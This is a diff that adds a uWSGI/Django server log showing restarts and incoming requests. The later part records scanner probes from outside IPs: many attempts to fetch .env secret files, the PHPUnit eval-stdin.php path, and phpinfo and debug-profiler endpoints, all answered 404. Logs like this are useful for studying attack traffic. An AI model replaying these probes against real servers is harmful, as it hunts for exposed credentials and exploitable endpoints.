@@ -1,0 +1,443 @@
+*** Starting uWSGI 2.0.19.1 (64bit) on [Thu Mar  4 13:29:31 2021] ***
+compiled with version: 6.3.0 20170516 on 04 March 2021 13:28:47
+os: Linux-5.4.0-1038-aws #40-Ubuntu SMP Fri Feb 5 23:50:40 UTC 2021
+nodename: 2f2bc23c31d8
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /srv/docker-server/apps.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.7 (default, Nov 16 2018, 22:33:19)  [GCC 6.3.0 20170516]
+Python main interpreter initialized at 0x55f44c70d3e0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55f44c70d3e0 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 8, cores: 2)
+[pid: 8|app: 0|req: 1/1] 222.118.132.162 () {44 vars in 861 bytes} [Thu Mar  4 22:29:36 2021] GET / => generated 24589 bytes in 184 msecs (HTTP/1.1 200) 5 headers in 168 bytes (2 switches on core 0)
+[pid: 8|app: 0|req: 2/2] 222.118.132.162 () {44 vars in 861 bytes} [Thu Mar  4 22:29:39 2021] GET / => generated 24589 bytes in 7 msecs (HTTP/1.1 200) 5 headers in 168 bytes (2 switches on core 1)
+[pid: 8|app: 0|req: 3/3] 222.118.132.162 () {44 vars in 861 bytes} [Thu Mar  4 22:29:42 2021] GET / => generated 24589 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 168 bytes (2 switches on core 0)
+[pid: 8|app: 0|req: 4/4] 222.118.132.162 () {44 vars in 861 bytes} [Thu Mar  4 22:29:45 2021] GET / => generated 24589 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 168 bytes (2 switches on core 1)
+[pid: 8|app: 0|req: 5/5] 222.118.132.162 () {44 vars in 861 bytes} [Thu Mar  4 22:30:16 2021] GET / => generated 24589 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 168 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 6/6] 222.118.132.162 () {42 vars in 840 bytes} [Thu Mar  4 22:31:28 2021] GET /admin => generated 0 bytes in 1 msecs (HTTP/1.1 301) 5 headers in 175 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 7/7] 222.118.132.162 () {42 vars in 842 bytes} [Thu Mar  4 22:31:28 2021] GET /admin/ => generated 0 bytes in 22 msecs (HTTP/1.1 302) 9 headers in 331 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 8/8] 222.118.132.162 () {42 vars in 879 bytes} [Thu Mar  4 22:31:28 2021] GET /admin/login/?next=/admin/ => generated 2214 bytes in 54 msecs (HTTP/1.1 200) 9 headers in 461 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 8|app: 0|req: 9/9] 222.118.132.162 () {42 vars in 806 bytes} [Thu Mar  4 22:31:29 2021] GET /favicon.ico => generated 2423 bytes in 7 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /srv/docker-server
+closing all non-uwsgi socket fds > 2 (max_fd = 1048576)...
+found fd 3 mapped to socket 0 (/srv/docker-server/apps.sock)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Thu Mar  4 22:33:33 2021] ***
+compiled with version: 6.3.0 20170516 on 04 March 2021 13:28:47
+os: Linux-5.4.0-1038-aws #40-Ubuntu SMP Fri Feb 5 23:50:40 UTC 2021
+nodename: 2f2bc23c31d8
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited UNIX address /srv/docker-server/apps.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.7 (default, Nov 16 2018, 22:33:19)  [GCC 6.3.0 20170516]
+Python main interpreter initialized at 0x55f2c6b993b0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55f2c6b993b0 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 11, cores: 2)
+Thu Mar  4 22:33:42 2021 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.19.1 (64bit) on [Thu Mar  4 13:39:52 2021] ***
+compiled with version: 6.3.0 20170516 on 04 March 2021 13:39:09
+os: Linux-5.4.0-1038-aws #40-Ubuntu SMP Fri Feb 5 23:50:40 UTC 2021
+nodename: 79e36673f910
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /srv/docker-server/apps.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.7 (default, Nov 16 2018, 22:33:19)  [GCC 6.3.0 20170516]
+Python main interpreter initialized at 0x557d8a8843e0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x557d8a8843e0 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 8, cores: 2)
+[pid: 8|app: 0|req: 1/1] 222.118.132.162 () {42 vars in 830 bytes} [Thu Mar  4 22:40:01 2021] GET / => generated 24589 bytes in 177 msecs (HTTP/1.1 200) 5 headers in 168 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 2/2] 222.118.132.162 () {42 vars in 842 bytes} [Thu Mar  4 22:40:06 2021] GET /admin/ => generated 0 bytes in 23 msecs (HTTP/1.1 302) 9 headers in 331 bytes (2 switches on core 1)
+[pid: 8|app: 0|req: 3/3] 222.118.132.162 () {42 vars in 879 bytes} [Thu Mar  4 22:40:06 2021] GET /admin/login/?next=/admin/ => generated 2214 bytes in 54 msecs (HTTP/1.1 200) 9 headers in 461 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 4/4] 222.118.132.162 () {42 vars in 842 bytes} [Thu Mar  4 23:11:55 2021] GET /admin/ => generated 0 bytes in 2 msecs (HTTP/1.1 302) 9 headers in 331 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 5/5] 222.118.132.162 () {42 vars in 879 bytes} [Thu Mar  4 23:11:55 2021] GET /admin/login/?next=/admin/ => generated 2214 bytes in 15 msecs (HTTP/1.1 200) 9 headers in 461 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 6/6] 211.36.133.107 () {42 vars in 829 bytes} [Fri Mar  5 00:36:14 2021] GET / => generated 24589 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 168 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 7/7] 211.36.133.107 () {42 vars in 878 bytes} [Fri Mar  5 00:38:46 2021] GET /admin/login/?next=/admin/ => generated 2214 bytes in 15 msecs (HTTP/1.1 200) 9 headers in 461 bytes (1 switches on core 0)
+Not Found: /.env
+[pid: 8|app: 0|req: 8/8] 132.145.152.156 () {36 vars in 513 bytes} [Fri Mar  5 00:55:13 2021] GET /.env => generated 2402 bytes in 7 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Forbidden (CSRF cookie not set.): /
+[pid: 8|app: 0|req: 9/9] 132.145.152.156 () {40 vars in 620 bytes} [Fri Mar  5 00:55:14 2021] POST / => generated 2994 bytes in 3 msecs (HTTP/1.1 403) 5 headers in 159 bytes (1 switches on core 0)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /srv/docker-server
+closing all non-uwsgi socket fds > 2 (max_fd = 1048576)...
+found fd 3 mapped to socket 0 (/srv/docker-server/apps.sock)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Fri Mar  5 01:17:52 2021] ***
+compiled with version: 6.3.0 20170516 on 04 March 2021 13:39:09
+os: Linux-5.4.0-1038-aws #40-Ubuntu SMP Fri Feb 5 23:50:40 UTC 2021
+nodename: 79e36673f910
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited UNIX address /srv/docker-server/apps.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.7 (default, Nov 16 2018, 22:33:19)  [GCC 6.3.0 20170516]
+Python main interpreter initialized at 0x55f5ec4343b0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55f5ec4343b0 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 11, cores: 2)
+Fri Mar  5 01:18:00 2021 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.19.1 (64bit) on [Thu Mar  4 16:18:47 2021] ***
+compiled with version: 6.3.0 20170516 on 04 March 2021 13:39:09
+os: Linux-5.4.0-1038-aws #40-Ubuntu SMP Fri Feb 5 23:50:40 UTC 2021
+nodename: 79e36673f910
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /srv/docker-server/apps.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.7 (default, Nov 16 2018, 22:33:19)  [GCC 6.3.0 20170516]
+Python main interpreter initialized at 0x55da3b7393e0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55da3b7393e0 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 7, cores: 2)
+[pid: 7|app: 0|req: 1/1] 211.36.133.107 () {42 vars in 828 bytes} [Fri Mar  5 01:18:59 2021] GET / => generated 24589 bytes in 261 msecs (HTTP/1.1 200) 5 headers in 168 bytes (1 switches on core 0)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /srv/docker-server
+closing all non-uwsgi socket fds > 2 (max_fd = 1048576)...
+found fd 3 mapped to socket 0 (/srv/docker-server/apps.sock)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Fri Mar  5 01:21:46 2021] ***
+compiled with version: 6.3.0 20170516 on 04 March 2021 13:39:09
+os: Linux-5.4.0-1038-aws #40-Ubuntu SMP Fri Feb 5 23:50:40 UTC 2021
+nodename: 79e36673f910
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited UNIX address /srv/docker-server/apps.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.7 (default, Nov 16 2018, 22:33:19)  [GCC 6.3.0 20170516]
+Python main interpreter initialized at 0x55a1f6a893b0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55a1f6a893b0 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 10, cores: 2)
+Fri Mar  5 01:21:55 2021 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.19.1 (64bit) on [Thu Mar  4 16:22:44 2021] ***
+compiled with version: 6.3.0 20170516 on 04 March 2021 13:39:09
+os: Linux-5.4.0-1038-aws #40-Ubuntu SMP Fri Feb 5 23:50:40 UTC 2021
+nodename: 79e36673f910
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /srv/docker-server/apps.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.7 (default, Nov 16 2018, 22:33:19)  [GCC 6.3.0 20170516]
+Python main interpreter initialized at 0x55590d84f3e0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55590d84f3e0 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 7, cores: 2)
+[pid: 7|app: 0|req: 1/1] 211.36.133.107 () {44 vars in 853 bytes} [Fri Mar  5 01:23:50 2021] GET / => generated 24589 bytes in 286 msecs (HTTP/1.1 200) 5 headers in 168 bytes (1 switches on core 0)
+Not Found: /.env
+[pid: 7|app: 0|req: 2/2] 196.77.109.136 () {36 vars in 512 bytes} [Fri Mar  5 01:52:53 2021] GET /.env => generated 2402 bytes in 15 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Forbidden (CSRF cookie not set.): /
+[pid: 7|app: 0|req: 3/3] 196.77.109.136 () {40 vars in 619 bytes} [Fri Mar  5 01:52:54 2021] POST / => generated 2994 bytes in 6 msecs (HTTP/1.1 403) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[pid: 7|app: 0|req: 4/4] 203.159.80.127 () {36 vars in 651 bytes} [Fri Mar  5 02:04:54 2021] GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 2540 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 7|app: 0|req: 5/5] 203.159.80.127 () {36 vars in 559 bytes} [Fri Mar  5 02:04:54 2021] GET /.env => generated 2402 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /vendor/.env
+[pid: 7|app: 0|req: 6/6] 203.159.80.127 () {36 vars in 573 bytes} [Fri Mar  5 02:04:55 2021] GET /vendor/.env => generated 2423 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Not Found: /assets/.env
+[pid: 7|app: 0|req: 7/7] 203.159.80.127 () {36 vars in 573 bytes} [Fri Mar  5 02:04:55 2021] GET /assets/.env => generated 2423 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /storage/.env
+[pid: 7|app: 0|req: 8/8] 203.159.80.127 () {36 vars in 575 bytes} [Fri Mar  5 02:04:55 2021] GET /storage/.env => generated 2426 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Not Found: /public/.env
+[pid: 7|app: 0|req: 9/9] 203.159.80.127 () {36 vars in 573 bytes} [Fri Mar  5 02:04:56 2021] GET /public/.env => generated 2423 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /app/.env
+[pid: 7|app: 0|req: 10/10] 203.159.80.127 () {36 vars in 567 bytes} [Fri Mar  5 02:04:56 2021] GET /app/.env => generated 2414 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Not Found: /admin/.env
+[pid: 7|app: 0|req: 11/11] 203.159.80.127 () {36 vars in 571 bytes} [Fri Mar  5 02:04:57 2021] GET /admin/.env => generated 4486 bytes in 8 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /laravel/.env
+[pid: 7|app: 0|req: 12/12] 203.159.80.127 () {36 vars in 575 bytes} [Fri Mar  5 02:04:57 2021] GET /laravel/.env => generated 2426 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Forbidden (CSRF cookie not set.): /
+[pid: 7|app: 0|req: 13/13] 203.159.80.127 () {40 vars in 666 bytes} [Fri Mar  5 02:04:58 2021] POST / => generated 2994 bytes in 2 msecs (HTTP/1.1 403) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /config/getuser
+[pid: 7|app: 0|req: 14/14] 205.185.122.102 () {40 vars in 661 bytes} [Fri Mar  5 03:30:49 2021] GET /config/getuser?index=0 => generated 2443 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+[pid: 7|app: 0|req: 15/15] 94.23.253.21 () {36 vars in 516 bytes} [Fri Mar  5 04:21:09 2021] GET / => generated 24589 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 168 bytes (1 switches on core 0)
+Not Found: /_static/.env
+[pid: 7|app: 0|req: 16/16] 94.23.253.21 () {36 vars in 540 bytes} [Fri Mar  5 04:21:20 2021] GET /_static/.env => generated 2426 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Not Found: /.c9/metadata/environment/.env
+[pid: 7|app: 0|req: 17/17] 94.23.253.21 () {36 vars in 575 bytes} [Fri Mar  5 04:21:30 2021] GET /.c9/metadata/environment/.env => generated 2477 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /.docker/.env
+[pid: 7|app: 0|req: 18/18] 94.23.253.21 () {36 vars in 541 bytes} [Fri Mar  5 04:21:36 2021] GET /.docker/.env => generated 2426 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Not Found: /.docker/laravel/app/.env
+[pid: 7|app: 0|req: 19/19] 94.23.253.21 () {36 vars in 565 bytes} [Fri Mar  5 04:21:47 2021] GET /.docker/laravel/app/.env => generated 2462 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /.env
+[pid: 7|app: 0|req: 20/20] 94.23.253.21 () {36 vars in 525 bytes} [Fri Mar  5 04:21:59 2021] GET /.env => generated 2402 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Not Found: /.env.backup
+[pid: 7|app: 0|req: 21/21] 94.23.253.21 () {36 vars in 539 bytes} [Fri Mar  5 04:22:10 2021] GET /.env.backup => generated 2423 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /.env.development.local
+[pid: 7|app: 0|req: 22/22] 94.23.253.21 () {36 vars in 561 bytes} [Fri Mar  5 04:22:20 2021] GET /.env.development.local => generated 2456 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Not Found: /.env.docker.dev
+[pid: 7|app: 0|req: 23/23] 94.23.253.21 () {36 vars in 547 bytes} [Fri Mar  5 04:22:30 2021] GET /.env.docker.dev => generated 2435 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /.env.local
+[pid: 7|app: 0|req: 24/24] 94.23.253.21 () {36 vars in 537 bytes} [Fri Mar  5 04:22:39 2021] GET /.env.local => generated 2420 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Not Found: /.env.prod
+[pid: 7|app: 0|req: 25/25] 94.23.253.21 () {36 vars in 535 bytes} [Fri Mar  5 04:22:49 2021] GET /.env.prod => generated 2417 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /.env.production.local
+[pid: 7|app: 0|req: 26/26] 94.23.253.21 () {36 vars in 559 bytes} [Fri Mar  5 04:23:00 2021] GET /.env.production.local => generated 2453 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+[pid: 7|app: 0|req: 27/27] 93.174.95.106 () {34 vars in 524 bytes} [Fri Mar  5 05:00:25 2021] GET / => generated 24589 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 168 bytes (1 switches on core 0)
+Not Found: /robots.txt
+[pid: 7|app: 0|req: 28/28] 93.174.95.106 () {30 vars in 347 bytes} [Fri Mar  5 05:00:26 2021] GET /robots.txt => generated 2420 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Not Found: /sitemap.xml
+[pid: 7|app: 0|req: 29/29] 93.174.95.106 () {30 vars in 349 bytes} [Fri Mar  5 05:00:26 2021] GET /sitemap.xml => generated 2423 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /.well-known/security.txt
+[pid: 7|app: 0|req: 30/30] 93.174.95.106 () {30 vars in 375 bytes} [Fri Mar  5 05:00:26 2021] GET /.well-known/security.txt => generated 2462 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+[pid: 7|app: 0|req: 31/31] 35.187.190.226 () {42 vars in 551 bytes} [Fri Mar  5 05:00:30 2021] GET / => generated 24589 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 168 bytes (1 switches on core 0)
+Not Found: /config/getuser
+[pid: 7|app: 0|req: 32/32] 205.185.122.102 () {40 vars in 661 bytes} [Fri Mar  5 06:40:48 2021] GET /config/getuser?index=0 => generated 2443 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+[pid: 7|app: 0|req: 33/33] 34.95.203.64 () {36 vars in 517 bytes} [Fri Mar  5 08:01:25 2021] GET / => generated 24589 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 168 bytes (1 switches on core 0)
+Not Found: /phpinfo.php
+[pid: 7|app: 0|req: 34/34] 34.95.203.64 () {36 vars in 539 bytes} [Fri Mar  5 08:01:28 2021] GET /phpinfo.php => generated 2423 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Not Found: /info.php
+[pid: 7|app: 0|req: 35/35] 34.95.203.64 () {36 vars in 533 bytes} [Fri Mar  5 08:01:31 2021] GET /info.php => generated 2414 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /php.ini
+[pid: 7|app: 0|req: 36/36] 34.95.203.64 () {36 vars in 531 bytes} [Fri Mar  5 08:01:34 2021] GET /php.ini => generated 2411 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Not Found: /debug/default/view
+[pid: 7|app: 0|req: 37/37] 34.95.203.64 () {36 vars in 578 bytes} [Fri Mar  5 08:01:38 2021] GET /debug/default/view?panel=config => generated 2457 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /_profiler/empty/search/results
+[pid: 7|app: 0|req: 38/38] 34.95.203.64 () {36 vars in 577 bytes} [Fri Mar  5 08:01:42 2021] GET /_profiler/empty/search/results => generated 2480 bytes in 6 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+[pid: 7|app: 0|req: 39/39] 162.142.125.39 () {28 vars in 299 bytes} [Fri Mar  5 08:40:47 2021] GET / => generated 24589 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 168 bytes (1 switches on core 0)
+[pid: 7|app: 0|req: 40/40] 162.142.125.39 () {34 vars in 431 bytes} [Fri Mar  5 08:40:47 2021] GET / => generated 24589 bytes in 7 msecs (HTTP/1.1 200) 5 headers in 168 bytes (1 switches on core 1)
+[pid: 7|app: 0|req: 41/41] 192.53.170.163 () {34 vars in 476 bytes} [Fri Mar  5 08:49:12 2021] GET / => generated 24589 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 168 bytes (1 switches on core 0)
+[pid: 7|app: 0|req: 42/42] 222.118.132.162 () {42 vars in 732 bytes} [Fri Mar  5 09:40:42 2021] GET / => generated 24589 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 168 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 7|app: 0|req: 43/43] 163.172.70.120 () {36 vars in 512 bytes} [Fri Mar  5 10:34:24 2021] GET /.env => generated 2402 bytes in 9 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Forbidden (CSRF cookie not set.): /
